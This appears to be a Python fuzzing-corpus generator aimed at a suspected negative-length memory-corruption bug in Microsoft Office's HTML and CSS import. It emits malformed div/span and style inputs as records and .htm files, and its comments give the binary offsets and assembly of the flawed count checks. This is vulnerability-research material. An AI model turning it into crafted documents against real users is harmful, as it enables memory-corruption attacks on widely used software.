#!/usr/bin/env python3
"""Div/span commit-path corpus aimed at the fetched-count going negative.

Target read on the shipping binary (mso 20430.20092 x64, STATE mso-html-import-20260923 SS92):
FCommitDivSpanCore's commit loop calls the token fetch with {967(div),2037(span)} and an `int`
out-count at [rbp+0x77]; the realloc branch then clamps that count through SafeInt for the
capacity, while the copy length at rva 0x3E97D0 comes from the raw signed value
(`movsxd r8, dword ptr [rbp+0x77] ; add r8, r8`).  The same pair exists in the ARM64 slice at
rva 0x13096e4/0x13096e8 (`add x0,x0,w8,sxtw #1` / `sbfiz x2,x9,#1,#0x20`).

Every shape below is chosen because the lexer has to rewind or pop without a matching opener --
the states in which an "end minus start" span can come out negative:

  * close tag with no opener (`</div>` / `</span>` at stream start)
  * opener with no closer, closer with no opener, crossed pairs (`<div><span></div></span>`)
  * implied end tags (p/li/td inside div/span) -- the parser pops an frame it did not open
  * truncated tag or unterminated attribute quote at EOF (fetch is asked for a range whose
    start was recorded before the truncation)
  * entity/reference runs at the boundary (`&`, `&#0;`, `&amp;` split across the commit)
  * content that straddles `</body>`/`</html>` (commit after the document closed)
  * nesting ladders around the table-capacity edges 4013/4014/4015 for div and span separately

Output is the record format the harness parses: `<decimal-length>\\n<body-bytes>` repeated.
"""
import os
import sys

out = sys.argv[1] if len(sys.argv) > 1 else "divneg.txt"
recs = []


def add(name, body):
    if isinstance(body, str):
        body = body.encode("latin-1", "replace")
    recs.append((name, body))


for tag in ("div", "span"):
    for k in (1, 2, 3, 4, 8, 16, 64, 256, 1024, 4013, 4014, 4015):
        add("close_only_%s_%d" % (tag, k), "<body>" + ("</%s>" % tag) * k + "text")
        add("open_only_%s_%d" % (tag, k), "<body>" + ("<%s>" % tag) * k + "text")
        add("open_then_other_close_%s_%d" % (tag, k),
            "<body>" + ("<%s>" % tag) * k + ("</p>" * k))
        add("tail_close_only_%s_%d" % (tag, k),
            "<body>abc<" + tag + ">def</body>" + ("</%s>" % tag) * k)

for k in (1, 2, 3, 8, 64):
    add("crossed_div_span_%d" % k, "<body>" + ("<div>" * k) + ("<span>" * k) +
        ("</div>" * k) + ("</span>" * k))
    add("crossed_span_div_%d" % k, "<body>" + ("<span>" * k) + ("<div>" * k) +
        ("</span>" * k) + ("</div>" * k))
    add("implied_p_in_div_%d" % k, "<body>" + ("<div><p>" * k))
    add("implied_li_in_div_%d" % k, "<body><ul>" + ("<div><li>" * k))
    add("implied_td_in_span_%d" % k, "<body><table><tr>" + ("<span><td>" * k))
    add("reopened_div_%d" % k, "<body>" + ("<div>x</div>" * k) + ("</div>" * k))

trunc = (
    ("<body><div cla"),
    ("<body><div "),
    ("<body><div"),
    ("<body><div class=\""),
    ("<body><div class=\"x"),
    ("<body><span style=\"color:red"),
    ("<body><div>text</sp"),
    ("<body><div>text</"),
    ("<body><div>text<"),
    ("<body><div title=\"a\" >t</div></body></div>"),
    ("<body><div>&"),
    ("<body><div>&#"),
    ("<body><div>&#0;"),
    ("<body><div>&amp"),
    ("<body><div>&amp;"),
    ("<body><div>&amp;xy</div>"),
    ("<body><div>x&#65;y</div>"),
    ("<body><div>&nbsp;</div>"),
    ("<body><div>&lt;/div&gt;</div>"),
    ("<body><span lang=\">x</span>"),
    ("<body><div>\x00</div>"),
    ("<body><div>\xff</div>"),
)
for i, t in enumerate(trunc):
    add("trunc_%02d" % i, t)

for n in (1, 2, 3, 16, 17, 127, 128, 129, 255, 256, 257, 1000, 4000):
    add("text_then_close_%d" % n, "<body><div>" + "t" * n + "</div>")
    add("text_then_no_close_%d" % n, "<body><div>" + "t" * n)
    add("attr_then_close_%d" % n, '<body><div title="' + "v" * n + '">t</div>')
    add("span_in_div_text_%d" % n, "<body><div><span>" + "t" * n + "</span></div>")
    add("nested_div_span_text_%d" % n,
        "<body>" + ("<div>" * (1 + n % 5)) + "<span>" + "t" * n + "</span>" +
        ("</div>" * (1 + n % 5)))

for d in (1, 2, 4, 9, 20, 63, 64, 65, 255, 256, 257, 4013, 4014, 4015, 4016):
    add("nest_div_%d" % d, "<html><body>" + ("<div>" * d) + "x" + ("</div>" * d) + "</body></html>")
    add("nest_span_%d" % d, "<html><body>" + ("<span>" * d) + "x" + ("</span>" * d) + "</body></html>")
    add("nest_div_short_%d" % d, "<html><body>" + ("<div>" * d) + "x" + ("</div>" * max(0, d - 1)) + "</body></html>")
    add("nest_div_long_%d" % d, "<html><body>" + ("<div>" * d) + "x" + ("</div>" * (d + 1)) + "</body></html>")

# ---- CSS family: FImportStyleSheet (mso 20092 x64 rva 0x7F9250) takes n from FClassifyRgwch's int*
# out-param, allocates 2*(n+2) with a 32-bit add and no sign test, then memcpy's 2*n into buf+2.
# These records put markup inside <style> / @import so the CSS classify runs on attacker-chosen text:
# unterminated strings and comments at EOF, quotes immediately before </style>, rules with no body,
# @import with a truncated url(), and the same shapes nested inside a div (both producers in one pass).
for k in (1, 2, 3, 8, 64, 256, 4013, 4014, 4015):
    add("css_rule_%d" % k, "<html><head><style>div{color:red}" + "a" * k + "</style></head><body>x</body></html>")
    add("css_open_str_%d" % k, "<html><head><style>x{y:\"abc" + "z" * k)
    add("css_close_str_%d" % k, "<html><head><style>x{y:\"abc\"}" + "w" * k)
    add("css_comment_eof_%d" % k, "<html><head><style>/*" + "c" * k)
    add("css_import_trunc_%d" % k, "<html><head><style>@import url(\"a" + "b" * k)
    add("css_no_close_tag_%d" % k, "<html><head><style>p{color:blue}</p>" + "d" * k)
    add("css_in_div_%d" % k, "<html><body><div><style>em{x:y}" + "e" * k + "</style></div>")
add("css_empty_rule", "<html><head><style>{}</style></head><body>q</body></html>")
add("css_only_at", "<html><head><style>@charset \"utf-8\";")
add("css_utf16_mix", "<html><head><style>@import url(file:///nonexistent/")
add("css_brace_no_semi", "<html><head><style>a{b c")
add("css_deep_braces", "<html><head><style>" + ("a{b:" * 60) + "v" * 300)

# The classifier behind FClassifyRgwch (mso 20092 x64 rva 0x1E0DC) writes its output run with
# `mov word ptr [r13], cx ; add r13, 2` (0x1E478/0x1E47D) and has a rewind branch
# `sub r13, 2` (0x1E4C3) taken from `test r15w, r15w ; jns` (0x1E49C/0x1E4A0) with r8d = 0x8000,
# i.e. for characters whose class word has bit 15 set.  It then stores the element count as
# `sub r13, r14 ; sar r13, 1 ; mov dword ptr [rdi+0x18], r13d` (0x1E93B..0x1E957) behind a guard
# that only rejects counts whose magnitude exceeds 0x7FFFFFFF (`mov eax,0x80000000 ; add rax,r13 ;
# cmp rax,rcx(=0xFFFFFFFF) ; ja -> mov ecx,5 ; int 0x29`), so a negative difference passes.
# These records place such characters at the head of a classified run, in each of the five
# (CPD*, CSSTK*) consumers of that out-param: <style> rule (FImportStyleSheet), inline style
# value and property name (FSetPropertyValue/FSetSelector), @page (FNewPageRule), @import, class
# (FSetListId/FSetListLfo).  Numeric character references are used so the corpus stays byte-safe;
# &#x10000; is emitted as the surrogate pair D800/DC00, which exercises the pair path itself.
for ch in ("&#xDCE0;", "&#xD800;", "&#xDFFF;", "&#x10000;", "&#xE000;", "&#xFDD0;", "&#xFFFF;",
           "&#xFEFF;", "&#x0;", "\\d800 ", "\\ffff ", "\\ ",
           "&#x4BE;", "&#x5D6;", "&#x6DE;", "&#x700;"):
    for shape in ("sheet_value", "sheet_name", "inline_value", "inline_name", "at_page",
                  "at_import", "class_attr"):
        if shape == "sheet_value":
            b = "<html><head><style>a{color:" + ch + "red}</style></head><body>x</body></html>"
        elif shape == "sheet_name":
            b = "<html><head><style>a{" + ch + "color:red}</style></head><body>x</body></html>"
        elif shape == "inline_value":
            b = "<html><body><div style=\"color:" + ch + "red\">t</div></body></html>"
        elif shape == "inline_name":
            b = "<html><body><span style=\"" + ch + "color:red\">t</span></body></html>"
        elif shape == "at_page":
            b = "<html><head><style>@page {size:" + ch + "A4}</style></head><body>x</body></html>"
        elif shape == "at_import":
            b = "<html><head><style>@import \"" + ch + "\";</style></head><body>x</body></html>"
        else:
            b = "<html><body><div class=\"" + ch + "\"><p id=\"" + ch + "\">q</p></div></body></html>"
        tag = ch.replace("&#x", "u").replace(";", "").replace("\\", "e").replace(" ", "")
        add("csstok_%s_%s" % (shape, tag), b)
        add("csstok_eof_%s_%s" % (shape, tag), b.replace("</style></head><body>x</body></html>", "")
                                            .replace("</div></body></html>", "</div>"))

# Window-edge sweep aimed at the producer's own arithmetic (STATE mso-html-import-20260923 SS117):
# PwchFetchToIhtks computes the count as (LBS+0x60 - LBS+0x68)/2 after checking only that the cursor
# LBS+0x68 lies in [LBS+0x50, LBS+0x50+0x4000], so the quantity goes negative when the cursor is inside
# that 16 KiB window slack but past the end of data.  The commit loop keeps iterating while the nesting
# counter (direction flag == 1 -> +1, else -1) is above zero, so a div/span with N unclosed inner spans
# and text ending inside the window requests further fetches after the data is consumed.  The sweep below
# therefore varies BOTH the unclosed-span count and the text length across the window edge (8192 WCHARs)
# and across a second window size (16384), one character at a time.
for _n in (0, 1, 2, 3, 5, 9):
    for _edge in (4096, 8192, 16384):
        for _d in range(-4, 5):
            _l = _edge + _d
            if _l < 1:
                continue
            add("spanwin_%d_%d_%+d" % (_n, _edge, _d),
                "<html><body><div>" + ("<span>" * _n) + ("t" * _l))
            add("spanwin_close_%d_%d_%+d" % (_n, _edge, _d),
                "<html><body><div>" + ("<span>" * _n) + ("t" * _l) + ("</span>" * _n) + "</div>")

# keep the window-edge sweep first so a run limited to the first records measures exactly that family
recs = [r for r in recs if r[0].startswith('spanwin')] + [r for r in recs if not r[0].startswith('spanwin')]

out_dir = None
if len(sys.argv) > 2:
    out_dir = sys.argv[2]
    os.makedirs(out_dir, exist_ok=True)

if out_dir:
    # the app-driven arm opens real files (double-click / `WINWORD.EXE <file>`), so emit each record
    # as its own .htm as well
    for name, body in recs:
        with open(os.path.join(out_dir, name + ".htm"), "wb") as f:
            f.write(body)
    print("htm_files=%d dir=%s" % (len(recs), out_dir))

with open(out, "wb") as f:
    for name, body in recs:
        f.write(("%d\n" % len(body)).encode("ascii"))
        f.write(body)


print("records=%d file=%s" % (len(recs), out))
